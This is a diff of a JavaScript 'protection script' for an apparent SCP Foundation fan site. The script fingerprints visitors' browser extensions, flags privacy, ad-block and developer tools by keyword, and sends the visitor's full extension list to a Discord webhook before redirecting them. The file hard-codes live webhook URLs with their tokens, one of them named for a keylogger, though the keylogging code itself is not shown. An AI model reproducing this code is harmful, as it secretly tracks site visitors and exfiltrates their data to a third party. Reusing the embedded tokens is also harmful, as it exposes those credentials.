@@ -1,16 +1,16 @@
-// =============================================================
+// ============================================================
 // SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT (Complete)
 // Protects: PLP-L-2, PLP-L-3, PLP-L-4, PLP-L-5
 //           L-5T-Code-of-Ethics, L-5T-Lockdown-Response-Code
 //           L-4-Lockdown-Response-Code, 3-LRC, 2-LRC
 //           L-4-Code-of-Ethics, L3-CoE, L2-CoE, L-1-CoE
-// =============================================================
+// ============================================================
 
 // Global violation tracking with limits
 let violationCount = 0;
 const violationHistory = [];
 const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
-const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0"; // REPLACE WITH YOUR SECOND WEBHOOK URL
+const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0";
 
 // Performance flag to prevent overload
 let isProcessingViolation = false;
@@ -193,7 +193,7 @@ async function detectVPN(ip) {
     }
 }
 
-// Detect browser extensions (specifically looking for security-related ones)
+// Detect browser extensions - IMPROVED VERSION
 async function detectBrowserExtensions() {
     if (cachedExtensions && extensionsCacheTime && (Date.now() - extensionsCacheTime) < EXTENSIONS_CACHE_DURATION) {
         return cachedExtensions;
@@ -204,56 +204,108 @@ async function detectBrowserExtensions() {
                                 'duplicate', 'download', 'html', 'page', 'guard', 'protect', 'shield',
                                 'privacy', 'adblock', 'ad block', 'safe', 'trust', 'vault', 'encrypt'];
     
-    const detectedExtensions = [];
-    const suspiciousExtensions = [];
+    const detectedExtensions = new Set(); // Use Set to avoid duplicates
+    const suspiciousExtensions = new Set();
     
-    // Method 1: Check for extension-specific DOM elements
-    const allElements = document.querySelectorAll('[id^="ext-"], [class^="ext-"], [data-extension-id]');
+    // Method 1: Check for Chrome extension APIs
+    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.id) {
+        detectedExtensions.add(`Chrome Extension: ${chrome.runtime.id}`);
+        // Check if extension ID contains suspicious keywords
+        for (const keyword of suspiciousKeywords) {
+            if (chrome.runtime.id.toLowerCase().includes(keyword)) {
+                suspiciousExtensions.add(`Extension ID: ${chrome.runtime.id}`);
+            }
+        }
+    }
+    
+    // Method 2: Check for browser extension API (Firefox)
+    if (typeof browser !== 'undefined' && browser.runtime && browser.runtime.id) {
+        detectedExtensions.add(`Browser Extension: ${browser.runtime.id}`);
+        for (const keyword of suspiciousKeywords) {
+            if (browser.runtime.id.toLowerCase().includes(keyword)) {
+                suspiciousExtensions.add(`Extension ID: ${browser.runtime.id}`);
+            }
+        }
+    }
+    
+    // Method 3: Check DOM for extension elements
+    const allElements = document.querySelectorAll('[id], [class]');
     allElements.forEach(el => {
-        const attrs = [...el.attributes].map(a => a.value.toLowerCase());
-        attrs.forEach(attr => {
-            suspiciousKeywords.forEach(keyword => {
-                if (attr.includes(keyword)) {
-                    const extName = attr.substring(0, 50);
-                    if (!detectedExtensions.includes(extName)) {
-                        detectedExtensions.push(extName);
-                        if (['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'].some(k => keyword === k)) {
-                            suspiciousExtensions.push(extName);
-                        }
-                    }
+        const id = el.id ? el.id.toLowerCase() : '';
+        const className = el.className ? (typeof el.className === 'string' ? el.className.toLowerCase() : '') : '';
+        const combined = id + ' ' + className;
+        
+        for (const keyword of suspiciousKeywords) {
+            if (combined.includes(keyword)) {
+                const extName = `Element: ${keyword} (${el.tagName})`;
+                if (!detectedExtensions.has(extName) && extName.length < 100) {
+                    detectedExtensions.add(extName);
                 }
-            });
-        });
+                
+                // Check for specifically restricted extensions
+                if (['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'].includes(keyword)) {
+                    suspiciousExtensions.add(`Suspicious element: ${keyword} in ${el.tagName}`);
+                }
+            }
+        }
     });
     
-    // Method 2: Check for common extension global variables
-    const extensionGlobals = ['chrome', 'browser', 'webextension', '__EXTENSION__'];
+    // Method 4: Check for extension-specific global variables
+    const extensionGlobals = ['webExtension', '__WEB_EXTENSION__', 'EXTENSION_ID', 'extension'];
     extensionGlobals.forEach(global => {
         if (window[global]) {
-            detectedExtensions.push(`Global: ${global}`);
+            detectedExtensions.add(`Global object: ${global}`);
+            suspiciousExtensions.add(`Global object: ${global}`);
         }
     });
     
-    // Method 3: Check for extension-related DOM mutations
-    const extensionDivs = document.querySelectorAll('div[id*="extension"], div[class*="extension"]');
-    extensionDivs.forEach(div => {
-        const id = div.id || div.className;
-        if (id && typeof id === 'string') {
-            suspiciousKeywords.forEach(keyword => {
-                if (id.toLowerCase().includes(keyword)) {
-                    const extName = id.substring(0, 50);
-                    if (!detectedExtensions.includes(extName)) {
-                        detectedExtensions.push(extName);
+    // Method 5: Check navigation and performance entries for extensions
+    try {
+        const resources = performance.getEntriesByType('resource');
+        const extensionUrls = resources.filter(r => 
+            r.name.includes('chrome-extension://') || 
+            r.name.includes('moz-extension://') ||
+            r.name.includes('safari-extension://')
+        );
+        
+        extensionUrls.forEach(url => {
+            const match = url.name.match(/(chrome-extension|moz-extension|safari-extension):\/\/([^\/]+)/);
+            if (match) {
+                const extId = match[2];
+                detectedExtensions.add(`Extension resource: ${extId.substring(0, 30)}`);
+                
+                for (const keyword of suspiciousKeywords) {
+                    if (extId.toLowerCase().includes(keyword)) {
+                        suspiciousExtensions.add(`Extension ID: ${extId}`);
                     }
                 }
-            });
-        }
-    });
+            }
+        });
+    } catch (e) {}
+    
+    // Method 6: Check for extension CSS
+    const styleSheets = document.styleSheets;
+    for (let i = 0; i < styleSheets.length; i++) {
+        try {
+            const href = styleSheets[i].href;
+            if (href && (href.includes('chrome-extension://') || href.includes('moz-extension://'))) {
+                const match = href.match(/(chrome-extension|moz-extension):\/\/([^\/]+)/);
+                if (match) {
+                    detectedExtensions.add(`Extension CSS: ${match[2].substring(0, 30)}`);
+                }
+            }
+        } catch (e) {}
+    }
+    
+    // Method 7: Check for messaging ports (indicates extension communication)
+    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.connect) {
+        detectedExtensions.add('Extension messaging API detected');
+    }
     
     const result = {
-        all: detectedExtensions,
-        suspicious: suspiciousExtensions,
-        hasSuspicious: suspiciousExtensions.length > 0
+        all: Array.from(detectedExtensions),
+        suspicious: Array.from(suspiciousExtensions),
+        hasSuspicious: suspiciousExtensions.size > 0
     };
     
     cachedExtensions = result;
@@ -365,15 +417,45 @@ function isJavaScriptEnabled() {
     return true;
 }
 
-// Antidote for suspicious extensions
+// FIXED: Anti-detection for suspicious extensions with HTML keyword
 async function checkAndRedirectForSuspiciousActivity(extensions, javaEnabled) {
     if (hasRedirected) return false;
     
-    const suspiciousExtensions = extensions.suspicious || [];
-    const hasSuspiciousExt = suspiciousExtensions.length > 0;
+    // Check for HTML keyword specifically
+    const hasHtmlExtension = extensions.all.some(ext => 
+        ext.toLowerCase().includes('html')
+    );
     
-    if (hasSuspiciousExt || javaEnabled) {
+    const hasSuspiciousExt = extensions.suspicious.length > 0 || hasHtmlExtension;
+    
+    // Also check for any extension with the restricted keywords
+    const restrictedKeywords = ['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'];
+    const hasRestrictedExt = extensions.all.some(ext => {
+        const lowerExt = ext.toLowerCase();
+        return restrictedKeywords.some(keyword => lowerExt.includes(keyword));
+    });
+    
+    if (hasSuspiciousExt || hasRestrictedExt || javaEnabled) {
         hasRedirected = true;
+        
+        // Build detailed reason
+        let reason = '';
+        let details = '';
+        
+        if (hasRestrictedExt) {
+            const matchedExts = extensions.all.filter(ext => {
+                const lowerExt = ext.toLowerCase();
+                return restrictedKeywords.some(keyword => lowerExt.includes(keyword));
+            });
+            reason = `Restricted extension detected: ${matchedExts.join(', ')}`;
+            details = `Full extension list: ${extensions.all.join(', ') || 'None'}`;
+        } else if (hasSuspiciousExt) {
+            reason = `Suspicious extension detected: ${extensions.suspicious.join(', ')}`;
+            details = `Full extension list: ${extensions.all.join(', ') || 'None'}`;
+        } else if (javaEnabled) {
+            reason = "Java is enabled";
+            details = "Java plugin is active in browser";
+        }
         
         // Send security alert
         const alertEmbed = {
@@ -382,8 +464,8 @@ async function checkAndRedirectForSuspiciousActivity(extensions, javaEnabled) {
             timestamp: new Date().toISOString(),
             fields: [
                 { name: "Violation Type", value: "Restricted Extension/Java Detected", inline: false },
-                { name: "Reason", value: hasSuspiciousExt ? `Suspicious extension detected: ${suspiciousExtensions.join(', ')}` : "Java is enabled", inline: false },
-                { name: "Details", value: `Full extension list: ${extensions.all.join(', ') || 'None'}`, inline: false },
+                { name: "Reason", value: reason, inline: false },
+                { name: "Details", value: details, inline: false },
                 { name: "User Action", value: "Redirecting to /NOEA-DEVICE-INF-A-503.html", inline: false }
             ],
             footer: { text: "SCP Foundation - Automatic Security Response" }
